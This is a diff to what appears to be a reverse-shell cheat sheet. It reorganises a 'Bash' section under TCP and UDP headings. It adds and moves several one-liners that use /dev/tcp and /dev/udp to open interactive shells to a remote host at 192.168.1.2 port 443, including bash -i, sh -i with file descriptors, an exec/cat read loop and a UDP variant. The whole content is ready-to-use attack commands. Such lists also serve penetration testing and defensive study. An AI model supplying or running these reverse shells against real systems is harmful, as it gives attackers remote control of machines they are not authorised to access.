@@ -59,16 +59,28 @@
  
   # <kbd>Bash</kbd>
  
+  # <kbd>TCP</kbd>
+ 
   ```cmd
   bash -i >& /dev/tcp/192.168.1.2/443 0>&1
+ 
+  bash -l > /dev/tcp/192.168.1.2/443 0<&1 2>&1
+
+  sh -i 5<> /dev/tcp/192.168.1.2/443 0<&5 1>&5 2>&5
 
   bash -c "bash -i >& /dev/tcp/192.168.1.2/443 0>&1"
   
   0<&196;exec 196<>/dev/tcp/192.168.1.2/443; sh <&196 >&196 2>&196
-
-  bash -l > /dev/tcp/192.168.1.2/443 0<&1 2>&1
+ 
+  exec 5<>/dev/tcp/192.168.1.2/443;cat <&5 | while read line; do $line 2>&5 >&5; done
   ```
+ 
+  # <kbd>UDP</kbd>
   
+  ```cmd
+  sh -i >& /dev/udp/192.168.1.2/443 0>&1
+  ```
+ 
   # <kbd>Bash URL Encoding</kbd>
   
   ```cmd
